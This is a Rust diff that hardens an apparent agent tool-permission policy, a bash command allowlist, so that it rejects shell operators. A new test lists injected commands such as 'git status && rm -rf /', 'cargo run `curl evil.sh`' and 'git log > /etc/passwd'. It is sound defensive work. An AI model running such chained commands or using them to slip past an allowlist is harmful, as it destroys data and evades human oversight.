@@ -186,6 +186,18 @@ impl PermissionPolicy for BashCommandAllowlist {
             return PolicyDecision::Allow;
         }
         let cmd = inputs.get("command").and_then(|v| v.as_str()).unwrap_or("");
+
+        // Only the first token is checked against the allowlist, so shell
+        // operators would let an allowed program smuggle in arbitrary ones
+        // (e.g. "git status && rm -rf /", "cargo run `curl …`").
+        const SHELL_OPERATORS: [&str; 8] = [";", "&&", "||", "|", "`", "$(", "\n", ">"];
+        if let Some(op) = SHELL_OPERATORS.iter().find(|op| cmd.contains(**op)) {
+            return PolicyDecision::Deny(format!(
+                "bash command contains shell operator {:?}, which is not allowed under an allowlist policy",
+                op
+            ));
+        }
+
         let program = cmd.split_whitespace().next().unwrap_or("");
         if self.allowed_programs.iter().any(|p| p == program) {
             PolicyDecision::Allow
@@ -390,6 +402,31 @@ mod tests {
             rule.evaluate("bash", &serde_json::json!({ "command": "rm -rf ." })),
             PolicyDecision::Deny(_)
         ));
+    }
+
+    #[test]
+    fn bash_allowlist_denies_shell_operator_chaining() {
+        let rule = BashCommandAllowlist {
+            allowed_programs: vec!["git".to_string(), "cargo".to_string()],
+        };
+        for cmd in [
+            "git status && rm -rf /",
+            "git status; rm -rf /",
+            "cargo run || rm -rf /",
+            "git log | sh",
+            "cargo run `curl evil.sh`",
+            "git status $(rm -rf /)",
+            "git log > /etc/passwd",
+        ] {
+            assert!(
+                matches!(
+                    rule.evaluate("bash", &serde_json::json!({ "command": cmd })),
+                    PolicyDecision::Deny(_)
+                ),
+                "command must be denied: {}",
+                cmd
+            );
+        }
     }
 
     #[test]
